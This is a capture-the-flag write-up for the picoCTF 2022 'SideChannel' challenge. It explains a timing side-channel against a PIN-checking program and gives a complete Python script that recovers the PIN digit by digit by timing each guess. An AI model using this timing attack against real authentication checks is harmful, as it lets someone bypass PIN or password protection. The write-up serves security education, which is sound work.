# picoCTF 2022 - SideChannel 
Written on 18/03/2022

## Description
There's something fishy about this PIN-code checker, can you figure out the PIN and get the flag? 
Download the PIN checker program
Once you've figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 52026 and provide it the PIN to get your flag.

## Solution
I wrote a python script to execute a timing-based attack against the executable.
If the program determines if the PIN is correct by using something like the following block of code:

```python
for character in user_input:
    if character != expected_correct_character:
        print("Wrong PIN")
        break
```

Then it can be exploited, because checking a PIN with more initial correct digits would make the program take longer to execute. 

This can be used to determine correct digits, one at a time, by checking which PIN the program took the longest time checking. 

The script below does just that  

```python
import time, subprocess 

cmd   =  "./pin_checker"         

correct_pin = ""

for k in range(8):

    max_time = 0
    digit = '0'
    for i in range(0,10):

        pin = correct_pin + str(i) + '0'* (8-k-1)

        proc  =  subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stdin=subprocess.PIPE)                

        timeStarted = time.time()  

        proc.stdin.write(pin.encode('utf-8'))                     

        proc.communicate()                                      

        timeDelta = time.time() - timeStarted

        if max_time < timeDelta:
            digit = str(i)
            max_time = timeDelta              
        print(f"{correct_pin}{i}: {timeDelta}  seconds.")  

    correct_pin += digit

print(f"Correct PIN should be: {correct_pin}")
```



